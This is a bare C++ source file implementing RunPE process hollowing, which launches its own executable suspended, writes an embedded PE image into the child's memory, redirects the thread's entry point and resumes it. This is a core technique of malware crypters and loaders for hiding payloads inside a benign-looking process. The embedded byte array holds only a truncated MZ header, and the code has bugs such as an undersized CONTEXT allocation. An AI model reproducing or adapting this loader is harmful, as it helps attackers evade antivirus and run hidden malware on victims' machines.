#include <iostream> 
#include <Windows.h> 
#include <TlHelp32.h>
#include <fstream>

int RunPortableExecutable(void* Image)
{
	IMAGE_DOS_HEADER* DOSHeader = PIMAGE_DOS_HEADER(Image);
	IMAGE_NT_HEADERS* NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);

	char CurrentFilePath[1024] = { 0 };
	GetModuleFileNameA(0, CurrentFilePath, 1024);

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
	{
		PROCESS_INFORMATION PI;
		STARTUPINFOA SI;

		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI))

		{

			CONTEXT* CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
			{
				DWORD* ImageBase = 0;

				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				void* pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);


				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
				{
					IMAGE_SECTION_HEADER* SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (i * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);


				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX));
				ResumeThread(PI.hThread);

				return 0;
			}
		}
	}
}
unsigned char rawData[] = 
{	
	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
	0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 
};

auto main(void) -> int
{
	RunPortableExecutable(rawData);
	
	getchar();

	return 0;
}
